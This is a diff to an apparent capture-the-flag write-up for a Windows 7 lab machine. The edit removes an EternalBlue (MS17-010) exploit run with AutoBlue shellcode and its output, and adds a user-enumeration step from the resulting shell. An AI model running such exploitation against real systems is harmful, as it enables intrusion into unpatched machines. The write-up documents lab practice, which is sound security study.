@@ -136,18 +136,6 @@ Saved as: sc_x64_payload.bin
 No encoder specified, outputting raw payload
 Payload size: 324 bytes
 Saved as: sc_x86_payload.bin
-
-```
-#python 42031.py 10.10.10.40 AutoBlue-MS17-010/shellcode/sc_all.bin 
-shellcode size: 2203
-numGroomConn: 13
-Target OS: Windows 7 Professional 7601 Service Pack 1
-SMB1 session setup allocate nonpaged pool success
-SMB1 session setup allocate nonpaged pool success
-good response status: INVALID_PARAMETER
-done
-
-```
 ```
 
 Trying both I get the same response of INVALID_PARAMETER, but that's supposed to be a good response.
@@ -233,6 +221,18 @@ Setting up two listeners for x64 and x86, I get a hit for x64:
 
 ![42031.py](blue_42031.JPG)
 
+
+Check for users
+
+```
+C:\Windows\system32>net users                                                                                                                                                                 
+net users                                                                                                                                                                                     
+                                                                                                                                                                                              
+User accounts for \\                                                                                                                                                                          
+-------------------------------------------------------------------------------                                                                                                               
+Administrator            Guest                    haris                                                                                                                                       
+The command completed with one or more errors.                                
+```
 
 Grab the flag for user haris.
 
